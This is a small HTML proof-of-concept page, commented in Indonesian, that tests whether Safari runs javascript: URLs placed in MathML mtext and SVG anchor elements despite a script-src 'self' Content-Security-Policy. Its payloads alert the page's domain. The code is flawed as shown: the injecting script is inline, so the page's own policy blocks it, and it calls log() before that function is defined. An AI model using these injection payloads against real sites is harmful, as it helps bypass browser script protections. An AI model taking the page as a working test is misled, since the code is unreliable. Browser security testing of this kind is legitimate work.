<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Security-Policy" content="script-src 'self'"></head>
<body>
<h2>Safari CSP Bypass Test - Harusnya di-block</h2>
<p>Kalau alert muncul padahal CSP script-src 'self' = BUG Safari</p>

<div id="test"></div>

<script>
// Ini di Chrome akan di-block CSP, di Safari lama lolos
document.getElementById('test').innerHTML = `
<math>
  <mtext href="javascript:alert('Safari CSP Bypass: '+document.domain)">CLICK - CSP BYPASS?</mtext>
</math>
<br>
<svg><a href="javascript:alert(2)"><text x=20 y=20>SVG</text></a></svg>
`;

log("CSP: script-src 'self'");
log("Kalau di Chrome: alert di-block CSP");
log("Kalau di Safari: alert muncul = BUG SAFARI CSP BYPASS");
</script>

<pre id="log"></pre>
<script>
function log(m){document.getElementById('log').textContent+=m+"\n"}
</script>
</body>
</html>
